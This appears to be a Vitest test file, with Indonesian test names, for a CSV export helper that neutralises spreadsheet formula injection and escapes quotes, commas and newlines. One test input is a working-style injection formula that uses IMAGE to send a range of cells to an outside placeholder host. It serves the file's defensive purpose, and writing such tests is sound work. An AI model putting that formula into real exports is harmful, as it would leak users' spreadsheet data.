import { describe, it, expect } from 'vitest';
import { buildCsv, csvCell } from './csv';

describe('csvCell', () => {
  it.each([
    ['=IMAGE("https://x/?"&C2:C500)', `"'=IMAGE(""https://x/?""&C2:C500)"`],
    ['+6281234', `"'+6281234"`],
    ['-1+2', `"'-1+2"`],
    ['@SUM(A1)', `"'@SUM(A1)"`],
    ['\tcmd', `"'\tcmd"`],
    ['\rcmd', `"'\rcmd"`],
  ])('menetralkan awalan formula %j', (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it('membiarkan teks biasa, hanya mengutip', () => {
    expect(csvCell('Budi Santoso')).toBe('"Budi Santoso"');
    expect(csvCell('a=b')).toBe('"a=b"');
  });

  it('meng-escape kutip, koma, dan baris baru', () => {
    expect(csvCell('Jl. "Mawar", No 1\nRT 2')).toBe('"Jl. ""Mawar"", No 1\nRT 2"');
  });

  it('menangani null/undefined/angka', () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
    expect(csvCell(42)).toBe('"42"');
    expect(csvCell(-5)).toBe(`"'-5"`);
  });
});

describe('buildCsv', () => {
  it('menyusun header + baris dengan CRLF', () => {
    expect(buildCsv(['Nama', 'Alamat'], [['=1+1', 'x']])).toBe(`"Nama","Alamat"\r\n"'=1+1","x"`);
  });
});
